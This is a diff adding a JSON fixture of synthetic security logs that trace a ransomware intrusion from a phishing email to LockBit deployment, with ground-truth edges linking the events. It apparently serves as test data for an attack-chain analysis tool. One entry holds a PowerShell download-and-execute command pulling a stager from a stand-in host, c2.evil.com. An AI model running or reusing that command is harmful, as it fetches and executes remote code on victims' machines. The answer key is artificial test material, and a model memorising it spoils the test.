@@ -1,0 +1,85 @@
+{
+  "logs": [
+    {
+      "event": "phishing_email",
+      "time": "2024-12-03T09:12:00",
+      "user": "j.martinez@corp.net",
+      "resource": "email_inbox",
+      "metadata": {
+        "sender": "hr-notifications@corp-update.com",
+        "subject": "Annual Bonus Confirmation - Action Required",
+        "has_attachment": true,
+        "attachment_name": "Bonus_Details_2024.xlsm"
+      }
+    },
+    {
+      "event": "malware_download",
+      "time": "2024-12-03T09:15:00",
+      "user": "j.martinez@corp.net",
+      "resource": "workstation_ws-042",
+      "metadata": {
+        "file": "Bonus_Details_2024.xlsm",
+        "payload_type": "macro_dropper",
+        "hash": "a3f2c8e91b7d4e5f6a0b1c2d3e4f5678",
+        "av_detected": false
+      }
+    },
+    {
+      "event": "code_execution",
+      "time": "2024-12-03T09:16:00",
+      "user": "j.martinez@corp.net",
+      "resource": "workstation_ws-042",
+      "metadata": {
+        "process": "powershell.exe",
+        "command": "IEX(New-Object Net.WebClient).DownloadString('http://c2.evil.com/stager')",
+        "parent_process": "EXCEL.EXE",
+        "execution_policy_bypass": true
+      }
+    },
+    {
+      "event": "privilege_escalation",
+      "time": "2024-12-03T09:22:00",
+      "user": "j.martinez@corp.net",
+      "resource": "workstation_ws-042",
+      "metadata": {
+        "from_role": "standard_user",
+        "to_role": "local_admin",
+        "method": "token_impersonation",
+        "tool_used": "PrintSpoofer"
+      }
+    },
+    {
+      "event": "lateral_movement",
+      "time": "2024-12-03T09:35:00",
+      "user": "j.martinez@corp.net",
+      "resource": "internal_network",
+      "metadata": {
+        "src_ip": "10.1.5.42",
+        "targets": ["10.1.5.10", "10.1.5.11", "10.1.5.50", "10.1.6.20"],
+        "method": "psexec",
+        "hosts_compromised": 4
+      }
+    },
+    {
+      "event": "ransomware_deployed",
+      "time": "2024-12-03T09:50:00",
+      "user": "j.martinez@corp.net",
+      "resource": "corporate_network",
+      "metadata": {
+        "ransomware_family": "LockBit 3.0",
+        "files_encrypted": 28500,
+        "extensions_targeted": [".docx", ".xlsx", ".pdf", ".sql", ".bak"],
+        "ransom_note": "README_RESTORE.txt",
+        "bitcoin_address": "bc1q...xyz",
+        "systems_affected": 5
+      }
+    }
+  ],
+  "ground_truth_edges": [
+    ["phishing_email", "malware_download"],
+    ["malware_download", "code_execution"],
+    ["code_execution", "privilege_escalation"],
+    ["privilege_escalation", "lateral_movement"],
+    ["lateral_movement", "ransomware_deployed"]
+  ]
+}
